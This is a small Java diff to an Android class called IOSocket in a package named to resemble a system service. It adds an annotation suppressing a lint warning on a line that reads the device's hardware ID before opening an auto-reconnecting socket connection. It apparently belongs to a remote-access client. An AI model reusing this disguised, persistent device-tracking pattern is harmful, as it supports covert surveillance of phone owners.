@@ -1,5 +1,6 @@
 package com.android.background.services;
 
+import android.annotation.SuppressLint;
 import android.os.Build;
 import android.provider.Settings;
 import java.net.URISyntaxException;
@@ -13,7 +14,7 @@ public class IOSocket {
     private IOSocket() {
         try {
 
-            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
+            @SuppressLint("HardwareIds") String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
             IO.Options opts = new IO.Options();
             opts.reconnection = true;
             opts.reconnectionDelay = 5000;
